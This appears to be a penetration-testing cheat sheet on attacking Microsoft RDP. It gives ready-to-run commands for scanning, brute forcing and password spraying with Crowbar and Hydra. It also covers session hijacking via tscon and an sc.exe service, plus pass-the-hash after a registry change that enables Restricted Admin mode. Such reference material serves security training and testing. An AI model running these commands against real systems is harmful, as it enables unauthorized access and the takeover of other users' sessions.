# RDP 
RDP is a proprietary Microsoft protocol which allows a user to connect to a remote system over a network connection and obtain a graphical user interface. RDP uses **port TCP/3389**.
```console
zero@pio$ nmap -Pn -p 3389 <TARGET> 
```

## Connection 

To perform a connection to a RDP:
```console
zero@pio$ xfreerdp /v:<TARGET> /u:<USER> /p:<PASSWORD>
```

```console
zero@pio$ rdesktop -u <USER> -p <PASSWORD> <TARGET>
```

## Explotation 

We can use the [Crowbar](https://github.com/galkan/crowbar) tool to brute force it:
```console
zero@pio$ crowbar -b rdp -s <TARGET> -U <USER LIST> -c '<PASSWORD>'
```

We can also use Hydra to perform an RDP password spray attack:
```console
zero@pio$ hydra -L <USER LIST> -p '<PASSWORD>' <TARGET> rdp
```

### RDP Session Hijacking 

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. For example, the following command will open a new console as the specified **SESSION_ID** within our current RDP session:
```console
C:\zeropio> tscon #<TARGET_SESSION_ID> /dest:#<OUR_SESSION_NAME>
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or [Mimikatz](https://github.com/gentilkiwi/mimikatz). We will use **Microsoft sc.exe** binary. First, we specify the service name (**sessionhijack**) and the **binpath**, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
```console
C:\zeropio> query user 

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\zeropio> sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:rdp-tcp#<NUMBER>"
```

To run the command, we can start the **sessionhijack** service:
```console
C:\zeropio> net start sessionhijack
```

### RDP Pass-the-Hash (PtH)

In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp. **Restricted Admin Mode**, which is disabled by default, should be enabled on the target host. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (**REG_DWORD**) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`{: .filepath}. It can be done using the following command:
```console
C:\zeropio> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option `/pth` to gain RDP access:
```console
xfreerdp /v:<TARGET> /u:<USER> /pth:<HASH>
```
